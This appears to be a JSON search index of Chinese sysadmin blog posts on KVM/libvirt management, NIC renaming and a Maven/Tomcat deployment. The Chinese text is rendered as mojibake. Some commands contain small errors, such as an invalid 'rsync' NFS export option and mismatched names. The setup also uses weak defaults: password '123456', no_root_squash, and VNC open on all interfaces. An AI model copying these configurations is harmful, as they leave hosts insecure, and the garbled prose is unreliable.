åˆ é™¤UUIDï¼Œmacåœ°å€ã€‚ä¿®æ”¹ä¸‹é¢ä¸¤ä¸ªå‚æ•°ä¸ºæ–°çš„ç½‘å¡åï¼š NAME=eth0 DEVICE=eth0 2.ä¿®æ”¹ç½‘å¡é…ç½®æ–‡ä»¶åç§° mv /etc/sysconfig/network-scripts/ifcfg-{ens33,eth0} 3.ä¿®æ”¹grubæ–‡ä»¶ä¸­GRUB_CMDLINE_LINUX vim /etc/default/grub net.ifnames=0 biosdevname=0 4.æ›´æ–°grub grub2-mkconfig -o /boot/grub2/grub.cfg ç„¶åé‡å¯ç³»ç»Ÿå°±å¯ä»¥äº† ","date":"2019-07-09 11:03","objectID":"/post/599/:0:0","tags":[],"title":"centos7ä¿®æ”¹ç½‘å¡å","uri":"/post/599/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"ç¯å¢ƒï¼š KVM01ï¼šå®‰è£…kvmã€nfsã€/opt/ç›®å½•ä¸ºç£ç›˜æ–‡ä»¶ç›®å½• KVM02ï¼šå®‰è£…kvmã€nfs hostè§£æï¼š 10.0.0.11Â kvm01 10.0.0.12Â kvm02 1.å®‰è£…nfs(ä¸¤å°KVMéƒ½è£…) yum install -y nfs-utils #æœåŠ¡ç«¯å®‰è£…rpcbind yum install -y rpcbind 2.kvm01é…ç½®nfs [root@kvm01 ~]# vim /etc/exports #å…±äº«ç›®å½•å†™è™šæ‹Ÿç£ç›˜æ–‡ä»¶ç›®å½• /opt 10.0.0.0/24(rw,rsync,no_root_squash) [root@kvm01 ~]# systemctl start rpcbind [root@kvm01 ~]# systemctl start nfs 3.KVM02æŒ‚è½½ç›®å½• #æ³¨æ„æŒ‚è½½çš„ç›®å½•è¦å’ŒåŸæ¥çš„ä¸€è‡´ï¼Œå¦åˆ™ä¼šæ‰¾ä¸åˆ°ç£ç›˜æ–‡ä»¶ [root@kvm02 ~]# mount -t nfs 10.0.0.11:/opt /opt/ 4.å¼€å§‹è¿ç§» #æŸ¥çœ‹å½“å‰è™šæ‹ŸæœºçŠ¶æ€ [root@kvm01 ~]# virsh list Id Name State ---------------------------------------------------- 16 centos7 running â€“liveÂ å®æ—¶è¿ç§» â€“verboseÂ æ˜¾ç¤ºè¿›åº¦ â€“unsafeÂ å¿½ç•¥å®‰å…¨ #è¿ç§» virsh migrate --live --verbose centos7 qemu+ssh://10.0.0.12/system --unsafe ","date":"2019-07-07 01:41","objectID":"/post/589/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVMåˆ©ç”¨nfsçƒ­è¿ç§»","uri":"/post/589/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"ä¸€ã€æ·»åŠ  virsh setvcpus we01-clone 4 äºŒã€é€šè¿‡é…ç½®æ–‡ä»¶æ·»åŠ  #å…³æœº virsh shutdown web01-clone #ç¼–è¾‘é…ç½®æ–‡ä»¶ virsh edit web01-clone \u003cvcpu placement=â€˜staticâ€™ current=â€˜2â€™\u003e4\u003c/vcpu\u003e #current:å½“å‰cpuæ•°é‡ #4ï¼šæœ€å¤§æ•°é‡é™åˆ¶ #å¼€æœº virsh start web01-clone æŸ¥çœ‹ï¼š #æŸ¥çœ‹ç‰©ç†CPUä¸ªæ•° cat /proc/cpuinfo| grep \"physical id\"| wc -l #æŸ¥çœ‹æ¯ä¸ªç‰©ç†CPUçš„æ ¸å¿ƒæ•° cat /proc/cpuinfo| grep \"cpu cores\"| uniq #æŸ¥çœ‹é€»è¾‘cpuä¸ªæ•° lscpu | grep 'CPU(s):' | head -n 1 ","date":"2019-07-06 21:34","objectID":"/post/586/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVMçƒ­æ·»åŠ CPUå’Œé…ç½®æ–‡ä»¶ä¿®æ”¹cpu","uri":"/post/586/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"æ·»åŠ å†…å­˜ ç«‹å³ç”Ÿæ•ˆï¼Œä¸´æ—¶çš„ã€‚ virsh setmem web01-clone 1024M â€“config ä¸ä¼šç«‹å³ä¸ç”Ÿæ•ˆï¼Œåœ¨ä¸‹ä¸€æ¬¡å¯åŠ¨ç”Ÿæ•ˆ virsh setmem web01-clone 1024M --config ä¿®æ”¹æœ€å¤§å†…å­˜é™åˆ¶ #å…³æœº virsh shutdown web01-clone #ä¿®æ”¹æœ€å¤§å†…å­˜ virsh setmaxmem web01-clone 2048M #æŸ¥çœ‹ç»“æœ virsh dominfo web01-clone | grep -i max ","date":"2019-07-06 20:49","objectID":"/post/584/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVMçƒ­æ·»åŠ å†…å­˜å’Œä¿®æ”¹æœ€å¤§å†…å­˜é™åˆ¶","uri":"/post/584/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"1.åˆ›å»ºç½‘å¡ â€“typeÂ ç½‘å¡ç±»å‹ â€“sourceÂ å®¿ä¸»æœºçš„ç½‘å¡ â€“modelÂ é©±åŠ¨æ¨¡å¼ â€“persistentÂ ä¿å­˜è‡³é…ç½®æ–‡ä»¶ virsh attach-interface web01-clone --type bridge --source br0 --model virtio --persistent æŸ¥çœ‹æ¥å£ä¿¡æ¯ï¼š virsh domiflist web01-clone åˆ é™¤ç½‘å¡ï¼š virsh detach-interface web01-cloneÂ --type bridge --mac 52:54:00:e9:8f:43Â --persistent ","date":"2019-07-06 20:15","objectID":"/post/578/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVMçƒ­æ·»åŠ ç½‘å¡","uri":"/post/578/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"ä¸€ã€çƒ­æ·»åŠ  1.åˆ›å»ºä¸€å—ç¡¬ç›˜ qemu-img create -f qcow2 /data/web01-clone-add01.qcow2 1G 2.æ·»åŠ ç¡¬ç›˜åˆ°è™šæ‹Ÿæœº æŒ‡å®šä¸»æœºåç§° æŒ‡å®šç£ç›˜æ–‡ä»¶ æŒ‡å®šç›®æ ‡è®¾å¤‡ â€“subdriverÂ æŒ‡å®šç£ç›˜æ–‡ä»¶ç±»å‹ â€“persistentÂ åŒæ—¶ä¿å­˜è‡³é…ç½®æ–‡ä»¶(ä¸åŠ æ¬¡å‚æ•°ä¸ºä¸´æ—¶ä¿®æ”¹) virsh attach-disk web01-clone /data/web01-clone-add01.qcow2 vdb --subdriver=qcow2 --persistent ç§»é™¤ç¡¬ç›˜å¯ä»¥ä½¿ç”¨ virsh detach-disk web01-clone vdb --persistent 3.æŸ¥çœ‹ è¿›ç³»ç»ŸæŸ¥çœ‹æˆ–è€…åœ¨å®¿ä¸»æœºä¸­æŸ¥çœ‹ å®¿ä¸»æœºï¼š virsh domblklist web01-clone è¿›ç³»ç»Ÿï¼š fdisk -l äºŒã€æ‰©å®¹å·²æœ‰ç¡¬ç›˜ 1.å¸è½½ç¡¬ç›˜(è™šæ‹Ÿæœºæ“ä½œ) umount /dev/vdb 2.ç§»é™¤ç¡¬ç›˜(å®¿ä¸»æœºæ“ä½œ) virsh detach-disk web01-clone vdb 3.æ‰©å®¹(+nGä»£è¡¨å¢åŠ nGå®¹é‡ï¼Œä¸å†™+å·ä»£è¡¨æ‰©å®¹è‡³nG) qemu-img resize /data/web01-clone-add01.qcow2 +1G 4.æ·»åŠ ç¡¬ç›˜è‡³è™šæ‹Ÿæœº virsh attach-disk web01-clone /data/web01-clone-add01.qcow2 vdb --subdriver qcow2 5.è¿›å…¥è™šæ‹Ÿæœºç³»ç»Ÿï¼Œé‡æ–°æŒ‚è½½ mount /dev/vdb /mnt # extæ–‡ä»¶ç³»ç»Ÿ resize2fs /dev/vdb #xfsæ–‡ä»¶ç³»ç»Ÿ xfs_growfs /dev/vdb æ­¤æ—¶df -ThæŸ¥çœ‹ç¡¬ç›˜å®¹é‡å·²ç»æ‰©å®¹æˆåŠŸ ","date":"2019-07-04 23:49","objectID":"/post/573/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVMçƒ­æ·»åŠ ç¡¬ç›˜å’Œæ‰©å®¹ç°æœ‰ç¡¬ç›˜","uri":"/post/573/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"1.æŸ¥çœ‹è™šæ‹Ÿç½‘å¡ brctl show 2.åˆ›å»ºç½‘æ¡¥ virsh iface-bridge eth0 br0 å–æ¶ˆæ—¶å¯ä»¥ä½¿ç”¨ virsh iface-unbridge br0 3.å…³æœºä¿®æ”¹é…ç½®æ–‡ä»¶ virsh shutdown web01-clone-2 virsh edit web01-clone-2 ä¿®æ”¹ä¸ºå¦‚ä¸‹å‚æ•°ï¼š \u003cinterface type=â€˜bridgeâ€™\u003e \u003csource bridge=â€˜br0â€™/\u003e 4.å¼€æœº virsh start web01-clone-2 ","date":"2019-07-04 22:43","objectID":"/post/571/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVMè™šæ‹Ÿæœºä¿®æ”¹ç½‘å¡ä¸ºæ¡¥æ¥ç½‘ç»œ","uri":"/post/571/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"1.å®Œæ•´å…‹éš† â€“auto-cloneÂ ä»åŸå§‹å®¢æˆ·æœºé…ç½®ä¸­è‡ªåŠ¨ç”Ÿæˆå…‹éš†åç§°å’Œå­˜å‚¨è·¯å¾„ã€‚ -oÂ åŸå§‹è™šæ‹Ÿæœº(è¯¥è™šæ‹Ÿæœºéœ€è¦åœ¨æŒ‚èµ·å’Œå…³æœºçš„çŠ¶æ€) -nÂ æ–°çš„è™šæ‹Ÿæœºåç§° virt-clone --auto-clone -o web01 -n web01-clone 2.é“¾æ¥å…‹éš† 1.åˆ›å»ºä¸€ä¸ªé“¾æ¥ç£ç›˜ -fÂ æŒ‡å®šç£ç›˜æ–‡ä»¶æ ¼å¼ç±»å‹ -bÂ æ‰§è¡Œé“¾æ¥ç£ç›˜æ–‡ä»¶è·¯å¾„ qemu-img create -f qcow2 -b /data/web01.qcow2 /data/web01-clone-2.qcow2 2.æŸ¥çœ‹é“¾æ¥ç£ç›˜çš„ä¿¡æ¯ï¼š [root@kvm01 ~]# qemu-img info /data/web01-clone-2.qcow2 image: /data/web01-clone-2.qcow2 file format: qcow2 virtual size: 10G (10737418240 bytes) disk size: 196K cluster_size: 65536 backing file: /data/web01.qcow2 Format specific information: compat: 1.1 lazy refcounts: false 3.å¯¼å‡ºæ¯æœºçš„é…ç½®æ–‡ä»¶ï¼Œå¹¶ä¿®æ”¹ç£ç›˜æ–‡ä»¶è·¯å¾„ virsh dumpxml web01 \u003e /etc/libvirt/qemu/web01-clone-2.xml ä¿®æ”¹åçš„å†…å®¹ï¼ŒUUIDå’Œmacåœ°å€éœ€è¦æ‰‹åŠ¨åˆ é™¤ egrep 'qcow2|name\u003e' /etc/libvirt/qemu/web01-clone-2.xml \u003cname\u003eweb01-clone-2\u003c/name\u003e \u003cdriver name='qemu' type='qcow2'/\u003e \u003csource file='/data/web01-clone-2.qcow2'/\u003e 4.å¯¼å…¥ã€å¼€æœº virsh define /etc/libvirt/qemu/web01-clone-2.xml virsh start web01-clone-2 5.è¿æ¥ã€æµ‹è¯• #æŸ¥çœ‹é…ç½®æ–‡ä»¶ï¼Œæ£€æŸ¥qcow2ç£ç›˜è·¯å¾„ï¼Œè¿˜æœ‰åŸå§‹ç£ç›˜æ–‡ä»¶ virsh dumpxml web01-clone-2 | grep -C 2 qcow2 #æŸ¥çœ‹ç«¯å£å·ï¼Œä½¿ç”¨vncè¿æ¥ virsh vncdisplay web01-clone-2 ","date":"2019-07-04 20:05","objectID":"/post/564/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVMå®Œæ•´å…‹éš†å’Œé“¾æ¥å…‹éš†","uri":"/post/564/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"å¿«ç…§ç›®å½•ï¼š/var/lib/libvert/qemu/snapshot/ 1.æŸ¥çœ‹å¿«ç…§ virsh snapshot-list web01 2.åˆ›å»ºå¿«ç…§ â€“nameÂ æŒ‡å®šå¿«ç…§åç§° virsh snapshot-create-as --name \"initial system\" web01 3.æ¢å¤å¿«ç…§ â€“snapshotnameÂ å¿«ç…§åç§° virsh snapshot-revert web01 --snapshotname 'initial system' 4.åˆ é™¤å¿«ç…§ â€“snapshotnameÂ å¿«ç…§åç§° virsh snapshot-delete web01 --snapshotname 'initial system' 5.æŸ¥çœ‹å¿«ç…§ä¿¡æ¯ virsh snapshot-info web01 --snapshotname 'init system' ","date":"2019-06-29 11:05","objectID":"/post/561/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVMå¿«ç…§ç®¡ç†å¸¸ç”¨å‘½ä»¤","uri":"/post/561/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"ç£ç›˜æ ¼å¼è¯´æ˜ï¼š rawï¼š è£¸æ ¼å¼ï¼Œå ç”¨ç©ºé—´æ¯”è¾ƒå¤§ï¼Œä¸æ”¯æŒå¿«ç…§åŠŸèƒ½ï¼Œæ€§èƒ½è¾ƒå¥½ï¼Œä¸æ–¹ä¾¿ä¼ è¾“ã€‚æ€»50G,ä½¿ç”¨2G,å®é™…å ç”¨å®¿ä¸»æœºç©ºé—´50G qcow2ï¼šcow ï¼ˆcopy on writeï¼‰å ç”¨ç©ºé—´å°ï¼Œæ”¯æŒå¿«ç…§ï¼Œæ€§èƒ½æ¯”rawå·®ä¸€ç‚¹ï¼Œæ–¹ä¾¿ä¼ è¾“ã€‚æ€»50G,ä½¿ç”¨2G,å®é™…å ç”¨å®¿ä¸»æœºç©ºé—´2G 1.æŸ¥çœ‹è™šæ‹Ÿç£ç›˜ä¿¡æ¯ qemu-img info /data/web01.raw 2.åˆ›å»ºä¸€å—ç¡¬ç›˜ #rawæ ¼å¼ qemu-img create /data/test.raw 1G #qcow2æ ¼å¼ qemu-img create -f qcow2 /data/test.qcow2 1G 3.æ‰©å®¹ç¡¬ç›˜(qcow2åªèƒ½å¢åŠ ä¸èƒ½ç¼©å°) qemu-img resize /data/test.qcow2 +2G 4.æ ¼å¼è½¬æ¢ï¼ˆè½¬æ¢åä¸ä¼šè¦†ç›–åŸæ–‡ä»¶ï¼‰ -fï¼šæŒ‡å®šè¢«è½¬æ¢æ ¼å¼ -Oï¼šè½¬æ¢åçš„æ ¼å¼ è¢«è½¬æ¢ç£ç›˜æ–‡ä»¶è·¯å¾„ è½¬æ¢åçš„ç£ç›˜æ–‡ä»¶è·¯å¾„ #raw==\u003eqcow2 qemu-img convert -f raw -O qcow2 /data/web01.raw /data/web01.qcow2 #vmdk==\u003eqcow2 qemu-img convert -f vmdk -O qcow2 /data/web01.vmdk /data/web01.qcow2 #ã€‚ã€‚ã€‚ã€‚ç•¥ ","date":"2019-06-29 10:22","objectID":"/post/556/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVM qemu-imgå¸¸ç”¨å‘½ä»¤","uri":"/post/556/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"1.å…³æœº virsh shutdown web01 virsh destroy web01 2.è½¬æ¢ç£ç›˜æ–‡ä»¶æ ¼å¼ qemu-img convert -f raw -O qcow2 /data/web01.raw /data/web01.qcow2 3.ä¿®æ”¹é…ç½®æ–‡ä»¶çš„ç£ç›˜ç±»å‹å’Œç£ç›˜è·¯å¾„ virsh edit web01 4.å¼€æœº virsh start web01 ","date":"2019-06-29 10:16","objectID":"/post/558/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVMç£ç›˜æ ¼å¼è½¬æ¢ï¼Œrawè½¬qcow2","uri":"/post/558/"},{"categories":["å…¶ä»–"],"content":"ä¿®æ”¹å†…æ ¸å‚æ•° grubby â€“update-kernel=ALL â€“args=â€œconsole=ttyS0,115200n8â€ é‡å¯ reboot ","date":"2019-06-27 21:56","objectID":"/post/549/:0:0","tags":[],"title":"centos7å¼€å¯consoleæ§åˆ¶å°ç™»å½•","uri":"/post/549/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"ä»¥è™šæ‹Ÿæœºåç§°ä¸ºcentos7ä¸¾ä¾‹ï¼š 1.æŸ¥çœ‹ä¸»æœºåˆ—è¡¨ virsh list --all 2.ç¼–è¾‘é…ç½®æ–‡ä»¶ #è™šæ‹Ÿæœºé…ç½®æ–‡ä»¶ virsh edit centos7 #ç½‘ç»œé…ç½®æ–‡ä»¶ virsh net-edit default 3.å¼€æœºï¼Œå…³æœºã€é‡å¯ã€å…³é—­ç”µæº virsh start centos7 virsh shutdown centos7 virsh reboot centos7 virsh destroy centos7 4.å¯¼å‡ºæŸ¥çœ‹è™šæ‹Ÿæœºé…ç½®æ–‡ä»¶ virsh dumpxml centos7 \u003e /backup/centos7.xml 5.ç§»é™¤å¯¼å…¥è™šæ‹Ÿæœº #ç§»é™¤ virsh undefine centos7 #å¯¼å…¥ virsh define /backup/centos7.xml 5.æŒ‚èµ·ã€æ¢å¤è™šæ‹Ÿæœº #æŒ‚èµ· virsh suspend centos7 #æ¢å¤ï¼ˆæ¢å¤æ—¶éœ€è¦æ³¨æ„æ—¶é—´åŒæ­¥é—®é¢˜ï¼‰ virsh resume centos7 6.æŸ¥çœ‹vncç«¯å£å· virsh vncdisplay centos7 7.ä¿®æ”¹è™šæ‹Ÿæœºåç§° #å…ˆå…³æœº virsh shutdown centos7 #ä¿®æ”¹åç§° virsh domrename centos7 web01 8.å¼€æœºå’Œå–æ¶ˆå¼€æœºå¯åŠ¨ï¼Œå‰æï¼šsystemctl enable libvirtd # å¼€æœºå¯åŠ¨ virsh autostart centos7 # å–æ¶ˆå¼€æœºå¯åŠ¨ virsh autostart --disable centos7 å®é™…ä¸Šæ˜¯å°†é…ç½®æ–‡ä»¶è½¯é“¾æ¥åˆ°/etc/libvirt/qemu/autostart/ç›®å½•ä¸‹ 9.é€šè¿‡consoleè¿æ¥è™šæ‹Ÿæœº virsh console centos7 10.é€šè¿‡ç£ç›˜æ–‡ä»¶æ§åˆ¶ç³»ç»Ÿæ–‡ä»¶ virt-cat 1.qcow2 /etc/passwd #æŸ¥çœ‹è™šæ‹Ÿç£ç›˜é‡Œçš„æ–‡ä»¶ virt-edit 1.qcow2 /etc/passwd #ç¼–è¾‘è™šæ‹Ÿç£ç›˜é‡Œçš„æ–‡ä»¶ï¼Œè™šæ‹Ÿæœºå¿…é¡»å¤„äºå…³æœºçŠ¶æ€ virt-df -h 1.qcow2 #æŸ¥çœ‹è™šæ‹Ÿç£ç›˜ä½¿ç”¨æƒ…å†µ virt-copy-out 1.qcow2 /etc/passwd /tmp/ #æ‹·è´è™šæ‹Ÿç£ç›˜ä¸­çš„ passwd æ–‡ä»¶åˆ° /tmp ç›®å½•ä¸‹ virt-copy-in 1.qcow2 /tmp/1.txt /root/ #æ‹·è´æœ¬åœ°çš„ 1.txt æ–‡ä»¶åˆ°è™šæ‹Ÿç£ç›˜çš„ /root/ ç›®å½•ä¸‹ 11.æŸ¥çœ‹æ”¯æŒå®‰è£…çš„ç³»ç»Ÿç‰ˆæœ¬ virt-install --os-variant list å¾…è¡¥å……ã€‚ã€‚ã€‚ ","date":"2019-06-27 21:43","objectID":"/post/526/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVMç®¡ç†è½¯ä»¶libvirtå¸¸ç”¨å‘½ä»¤","uri":"/post/526/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"æ–¹æ³•1ï¼šè‡ªå¸¦å‘½ä»¤ä¿®æ”¹ #å…ˆå…³æœº virsh shutdown centos7 #ä¿®æ”¹åç§° virsh domrename centos7 web01 æœ€å¥½ä¿è¯è™šæ‹Ÿæœºåç§°å’Œç£ç›˜æ–‡ä»¶ä¸€è‡´ï¼Œé¡ºä¾¿ä¿®æ”¹ä¸€ä¸‹ç£ç›˜æ–‡ä»¶åç§° #ä¿®æ”¹ç£ç›˜æ–‡ä»¶åç§° mv /data/centos2.raw /data/web01.raw #ä¿®æ”¹é…ç½®æ–‡ä»¶ä¸­ç£ç›˜æ–‡ä»¶çš„è·¯å¾„åç§° virsh edit web01 \u003csource file='/data/web01.raw'/\u003e #å¼€æœº virsh start web01 æ–¹æ³•2ï¼šä¿®æ”¹é…ç½®æ–‡ä»¶ å…ˆå…³æœº virsh shutdown centos7 ä¿®æ”¹é…ç½®æ–‡ä»¶ä¸­\u003cname\u003e\u003c/name\u003e,åˆ é™¤uuidï¼Œä¿®æ”¹ç£ç›˜æ–‡ä»¶è·¯å¾„ã€‚åŸæ–‡ä»¶å¯è‡ªè¡Œå¤‡ä»½ vim /etc/libvirt/qemu/centos7.xml ä¿®æ”¹ç£ç›˜æ–‡ä»¶åç§° mv /data/centos2.raw /data/web01.raw ä¿®æ”¹é…ç½®æ–‡ä»¶åç§° mv /etc/libvirt/qemu/{centos7,web01}.xml åˆ é™¤è™šæ‹Ÿæœº virsh undefine centos7 å¯¼å…¥è™šæ‹Ÿæœº virsh define /etc/libvirt/qemu/web01.xml å¼€æœº virsh start web01","date":"2019-06-27 21:32","objectID":"/post/545/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVMè™šæ‹Ÿæœºä¿®æ”¹è™šæ‹Ÿæœºåç§°2ç§æ–¹æ³•","uri":"/post/545/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"è™šæ‹Ÿæœºåç§°ï¼šcentos7 ç£ç›˜æ–‡ä»¶è·¯å¾„ï¼š/opt/centos2.raw 1.å…³æœº virsh shutdown centos7 2.ç§»åŠ¨ç£ç›˜æ–‡ä»¶åˆ°æ–°ç›®å½• mv /opt/centos2.raw /data 3.ç¼–è¾‘é…ç½®æ–‡ä»¶ virsh edit centos7 å°†ç£ç›˜æ–‡ä»¶è·¯å¾„ä¿®æ”¹ä¸ºæ–°è·¯å¾„ 4.å¼€æœº virsh start centos7 ","date":"2019-06-27 20:08","objectID":"/post/543/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVMè¿ç§»ç›®å½•","uri":"/post/543/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"1.ç¼–è¾‘é…ç½®æ–‡ä»¶ virsh edit centos7 æ·»åŠ çº¢æ¡†ä¸­çš„å†…å®¹ 2.è®¾ç½®é•œåƒæ–‡ä»¶è·¯å¾„ 3.é‡å¯æµ‹è¯• virsh destroy centos7 ","date":"2019-06-27 16:19","objectID":"/post/535/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVMä¿®æ”¹å…‰ç›˜ä¸ºç¬¬ä¸€å¯åŠ¨é¡¹ï¼Œå¹¶æ·»åŠ å…‰ç›˜é•œåƒ","uri":"/post/535/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"ä½¿ç”¨natéœ€è¦åœ¨å®¿ä¸»æœºä¸­å¼€å¯æ•°æ®åŒ…è½¬å‘ ä¸´æ—¶ä¿®æ”¹ï¼š sysctl -w net.ipv4.ip_forward=1 é‡æ–°åŠ è½½ï¼š sysctl -p æ°¸ä¹…ä¿®æ”¹ï¼š ä¿®æ”¹é…ç½®æ–‡ä»¶ vim /etc/sysctl.conf net.ipv4.ip_forward=1 ","date":"2019-06-27 16:10","objectID":"/post/533/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVMè§£å†³natä¸èƒ½ä¸Šç½‘çš„é—®é¢˜","uri":"/post/533/"},{"categories":["è™šæ‹ŸåŒ–"],"content":"1.æŸ¥çœ‹CPUæ˜¯å¦æ”¯æŒè™šæ‹ŸåŒ– egrep '(vmx|svm)' /proc/cpuinfo vmx(intel) svm(AMD) åœ¨Linux 2.6.20å†…æ ¸ä¹‹åçš„ç‰ˆæœ¬é»˜è®¤æ˜¯é›†æˆKVMçš„ï¼Œå¦‚æœæ˜¯ä»¥ä¸‹çš„ç‰ˆæœ¬éœ€è¦å‡çº§ä»¥ä¸‹å†…æ ¸ã€‚ï¼ˆå¯ä»¥ç”¨uname -ræŸ¥çœ‹ï¼‰ 2.å®‰è£…KVMå’Œlibvirt(KVMç®¡ç†å·¥å…·) yum install libvirt virt-install qemu-kvm -y 3.å¼€å¯libvirtæœåŠ¡ systemctl enable libvirtd systemctl start libvirtd 4.ä¸Šä¼ ç³»ç»Ÿé•œåƒï¼Œå®‰è£…ç³»ç»Ÿä½¿ç”¨ é€šè¿‡xftpä¸Šä¼ æˆ–è€…ä½¿ç”¨å…‰ç›˜ç”Ÿæˆ å°†å…‰ç›˜æ’å…¥å…‰é©±ç„¶åæ‰§è¡Œï¼Œåå­—éœ€è¦è‡ªå·±å®šä¹‰ï¼š dd if=/dev/cdrom of=/opt/CentOS-7-x86_64-DVD-1804.iso 5.æ·»åŠ ä¸€å°è™šæ‹Ÿæœº virt-install \\ --virt-type kvm \\ --os-type=linux \\ --os-variant rhel7 \\ --name centos7 \\ --memory 1024 \\ --vcpus 1 \\ --disk /opt/centos2.raw,format=raw,size=10 \\ --cdrom /opt/CentOS-7-x86_64-DVD-1804.iso \\ --network network=default \\ --graphics vnc,listen=0.0.0.0 \\ --noautoconsoleÂ å‚æ•°è¯´æ˜ï¼š --virt-type kvm #è™šæ‹Ÿæœºç±»å‹kvm --os-type=linux #ç³»ç»Ÿç±»å‹ --os-variant rhel7 #ç³»ç»Ÿç‰ˆæœ¬ --name centos7 #è™šæ‹Ÿæœºåç§° --memory 1024 #å†…å­˜ --vcpus 1 #cpuæ•°é‡ --disk /opt/centos2.raw,format=raw,size=10 #ç£ç›˜æ–‡ä»¶è·¯å¾„ï¼ˆç¡¬ç›˜) --cdrom /opt/CentOS-7-x86_64-DVD-1804.iso #å…‰ç›˜é•œåƒ --network network=default #ç½‘ç»œé»˜è®¤ä¸ºnat --graphics vnc,listen=0.0.0.0 #vncç›‘å¬åœ°å€ --noautoconsoleÂ #ä¸è‡ªåŠ¨è¿æ¥æ§åˆ¶å° æ·»åŠ å®Œæˆåï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹è®¾å¤‡çŠ¶æ€å’Œvncç«¯å£å· #æŸ¥çœ‹ä¸»æœºåˆ—è¡¨ virsh list --all #æŸ¥çœ‹vncç«¯å£å· virsh vncdisplay centos7 6.ä½¿ç”¨vncå®‰è£…ç³»ç»Ÿ è¿™é‡Œæˆ‘å…³é—­äº†KDUMPï¼Œåˆ†åŒºæ²¡æœ‰åˆ†swapåˆ†åŒº é…ç½®æ–‡ä»¶è·¯å¾„ï¼š /etc/libvirt/qemu/xxxxx.xml ","date":"2019-06-25 23:58","objectID":"/post/521/:0:0","tags":["KVM","è™šæ‹ŸåŒ–"],"title":"KVMå®‰è£…ï¼Œå¹¶åˆ›å»ºä¸€å°linuxè™šæ‹Ÿæœº","uri":"/post/521/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¸‹è½½jeesnsï¼š git clone https://gitee.com/zchuanzhao/jeesns.git cd jeesns åˆ›å»ºæ•°æ®åº“ï¼š mysql -uroot -p create database jeesns character set utf8 collate utf8_general_ci; grant all on jeesns.* to jeesns@localhost identified by '123456'; å¯¼å…¥æ•°æ®åº“ mysql -ujeesns -p123456 jeesns \u003c ./jeesns-web/database/jeesns.sql ä¿®æ”¹jeesnsæ•°æ®åº“é…ç½®ä¿¡æ¯ï¼š vim ./jeesns-web/src/main/resources/jeesns.properties ä¿®æ”¹å¦‚ä¸‹ä¸‰é¡¹å†…å®¹ï¼šæ•°æ®åº“åœ°å€ã€ç”¨æˆ·åã€å¯†ç  jdbc.url jdbc.user jdbc.password ç¼–è¯‘ç”ŸæˆwaråŒ…ï¼š mvn install:install-file -Dfile=./jeesns-core/jeesns-core.jar -DgroupId=com.lxinet -DartifactId=jeesns-core -Dversion=1.4 -Dpackaging=jar mvn clean package éƒ¨ç½²waråŒ…åˆ°tomcatï¼š cp ./jeesns-web/target/jeesns-web.war /application/tomcat/webapps/jeesns.war é‡å¯tomcat /application/tomcat/bin/shutdown.sh /application/tomcat/bin/startup.sh ","date":"2019-06-24 23:32","objectID":"/post/493/:0:0","tags":["tomcat","java"],"title":"jeesnséƒ¨ç½²","uri":"/post/493/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"mavenäºŒè¿›åˆ¶åŒ…ä¸‹è½½åœ°å€ï¼š http://mirror.bit.edu.cn/apache/maven/maven-3/3.6.1/binaries/apache-maven-3.6.1-bin.tar.gz è§£å‹å®‰è£…ï¼š *å®‰è£…å‰éœ€è¦å…ˆå®‰è£…oracle jdk tar xf apache-maven-3.6.1-bin.tar.gz -C /application/ ln -s /application/apache-maven-3.6.1/ /application/maven echo 'PATH=$PATH:/application/maven/bin' \u003e\u003e /etc/profile source /etc/profile ä¸‹è½½jeesns git cloneÂ https://gitee.com/zchuanzhao/jeesns.git ç¼–è¯‘jeesnsä¸ºwaråŒ…,mavenåŠ é€Ÿè¯·å‚è€ƒ cd jeesns æŒ‰ç…§å®˜ç½‘è¯´æ˜å…ˆæ‰§è¡Œï¼š mvn install:install-file -Dfile=./jeesns-core/jeesns-core.jarÂ -DgroupId=com.lxinet -DartifactId=jeesns-core -Dversion=1.4.2 -Dpackaging=jar mvn clean package ç¼–è¯‘æˆåŠŸåä¼šç”Ÿæˆåœ¨ä¸‹é¢çš„ä½ç½®ï¼š jeesns/jeesns-web/target/jeesns-web.war ","date":"2019-06-24 22:47","objectID":"/post/484/:0:0","tags":["tomcat","java","maven"],"title":"å®‰è£…å¹¶ä½¿ç”¨mavenç¼–è¯‘javaé¡¹ç›®","uri":"/post/484/"},{"categories":["å…¶ä»–"],"content":"ç¼–è¾‘conf/settings.xml åœ¨\u003cmirrors\u003e\u003c/mirrors\u003eä¸­æ·»åŠ å¦‚ä¸‹å†…å®¹ \u003cmirror\u003e \u003cid\u003enexus-aliyun\u003c/id\u003e \u003cmirrorOf\u003e*\u003c/mirrorOf\u003e \u003cname\u003eNexus 